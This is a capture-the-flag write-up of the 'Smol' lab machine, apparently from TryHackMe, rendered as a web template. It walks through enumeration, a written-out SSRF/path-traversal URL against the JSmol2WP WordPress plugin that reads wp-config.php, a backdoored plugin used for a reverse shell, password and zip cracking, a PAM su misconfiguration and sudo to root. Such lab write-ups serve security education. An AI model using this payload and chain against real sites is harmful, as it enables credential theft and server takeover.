{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("Let's begin by scanning all the ports.")}}

{{console("nmap -T5 -p- -sC 10.10.67.9", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 16:01 CET
Nmap scan report for 10.10.67.9
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://www.smol.thm

Nmap done: 1 IP address (1 host up) scanned in 209.24 seconds")}}

{{text("We find 2 open ports.")}}

{{list(['22 (SSH)', '80 (HTTP)'])}}

{{text("Firstly, we add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://smol.thm</code> to our <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> file.")}}

{{text("Now we can visit the site.")}}

{{image("../../static/writeups/smol/images/000001.jpg")}}

{{text("I couldn't find anything interesting on the page, so I tried directory scanning.")}}

{{console("gobuster dir -u http://www.smol.thm -w /usr/share/wordlists/dirb/big.txt", "===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================")}}

{{header("Web Access", "web-access")}}

{{text("It seems like the page was built using Wordpress, meaning that we can use a tool named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>WPScan</code> to check if there are any known vulnerabilities.")}}

{{text("For WPScan to show you found vulnerabilities, you have to have an API token which you can get for free by creating an account on their site.")}}

{{console("wpscan --url http://www.smol.thm --api-token [REDACTED]", "_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ 
           \ \/  \/ / |  ___/ ___ \ / __|/ _` | '_ 
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ ___|__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://www.smol.thm/ [10.10.67.9]
[+] Started: Mon Feb 15 16:17:43 2025

...

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
...")}}

{{text("Seems like there are 2 known vulnerabilities we could potentialy exploit, XSS and SSRF.")}}

{{text("The second one looked more useful, so I went and used that one.")}}

{{text("From the references, we can obtain an example payload to exploit the vulnerability.")}}

{{console("http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php")}}

{{text("We simply edit the URL and read the config file.")}}

{{image("../../static/writeups/smol/images/000002.jpg")}}

{{text("There, we can find a password in plaintext for the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wpuser</code> user.")}}

{{text("We navigate to the admin login page at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://www.smol.thm/wp-admin/</code> and input the credentials.")}}

{{image("../../static/writeups/smol/images/000003.jpg")}}

{{header("Shell as www-data", "shell-as-www-data")}}

{{text("Under the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Pages</code> menu, I found an interesting note.")}}

{{image("../../static/writeups/smol/images/000004.jpg")}}

{{text("I searched for this plugin, and found a GitHub page.")}}

{{link("https://github.com/WordPress/hello-dolly/blob/trunk/hello.php", "../../../static/writeups/images/github.jpg", "hello-dolly")}}

{{text("Now that we know the name of the file we should look for, which is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hello.php</code>, we can use the same vulnerability once again and read the source code of it.")}}

{{image("../../static/writeups/smol/images/000005.jpg")}}

{{text("Compared to the Github's version, we can notice that there is a new line added in the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hello_dolly</code> function.")}}

{{image("../../static/writeups/smol/images/000006.jpg")}}

{{text("We can decode this base64 string using CyberChef.")}}

{{image("../../static/writeups/smol/images/000007.jpg")}}

{{text("The <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>143</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>155</code> are characters in octal that mean <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cm</code>, the last character is probably <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>d</code> in hexadecimal.")}}

{{text("That means we should be able to run commands by using the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>?cmd</code> parameter.")}}

{{text("We navigate to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>revshells.com</code> and get a base64 encoded reverse shell. I used the BusyBox one.")}}

{{text("We setup a listener and send our payload. Remember to decode it.")}}

{{image("../../static/writeups/smol/images/000008.jpg")}}

{{text("It worked successfully.")}}

{{header("Shell as diego", "shell-as-diego")}}

{{text("Since the password for <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wpuser</code> was saved as the password to the database, we can try to have a look at it.")}}

{{image("../../static/writeups/smol/images/000009.jpg")}}

{{text("We dump the contents of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wp_users</code> table that contains user credentials.")}}

{{image("../../static/writeups/smol/images/000010.jpg")}}

{{text("We copy all the hashed passwords onto our machine and attempt to crack them.")}}

{{text("After a while, we get the password of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>diego</code>")}}

{{image("../../static/writeups/smol/images/000011.jpg")}}

{{header("Shell as think", "shell-as-think")}}

{{text("Now as the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>diego</code> user, we check our permissions and groups.")}}

{{image("../../static/writeups/smol/images/000012.jpg")}}

{{text("It seems like we are a part of the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>internal</code> group, which allows us to read and access files in other users home directories.")}}

{{text("Navigating through different home folders, I stumbled upon user's <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>think</code> SSH key.")}}

{{image("../../static/writeups/smol/images/000013.jpg")}}

{{text("We copy the key, save it into a file and log in as the new user using SSH.")}}

{{header("Shell as gege", "shell-as-gege")}}

{{text("This was the hardest and the easiest part of the room. There is a configuration file at <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/pam.d/su</code> with specific rules.")}}

{{console("cat /etc/pam.d/su", "#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
...")}}

{{text("This code means that if the current user is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>think</code> and we try to switch user to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>gege</code>, it will succeed.")}}

{{image("../../static/writeups/smol/images/000014.jpg")}}

{{header("Shell as xavi", "shell-as-xavi")}}

{{text("In home directory of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>gege</code> is a zipped archive named <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>wordpress.old.zip</code>. Since it is probably the old source code of the website, it might contain more exposed passwords.")}}

{{text("We download the archive onto our machine by creating a HTTP server using python and using wget.")}}

{{image("../../static/writeups/smol/images/000015.jpg")}}

{{text("The archive is password protected, so we have to crack it. We use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>zip2john</code> on the archive, and use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>john</code> on the extracted hash.")}}

{{image("../../static/writeups/smol/images/000016.jpg")}}

{{text("Now we unzip the archive and try to look for anything interesting.")}}

{{console("cat wp-config.php", "<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to \"wp-config.php\"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

...

/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', '[REDACTED]' );
...")}}

{{text("This is probably the password of user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>xavi</code>.")}}

{{text("We try the password, and it works.")}}

{{image("../../static/writeups/smol/images/000017.jpg")}}

{{header("Shell as root", "shell-as-root")}}

{{text("Since we know current user's password, we check our sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL")}}

{{text("This means we can run any command as any user, so we can simply switch to root.")}}

{{image("../../static/writeups/smol/images/000018.jpg")}}

{{text("Now we can get the last flag.")}}

{{image("../../static/writeups/smol/images/000019.jpg")}}

{{script()}}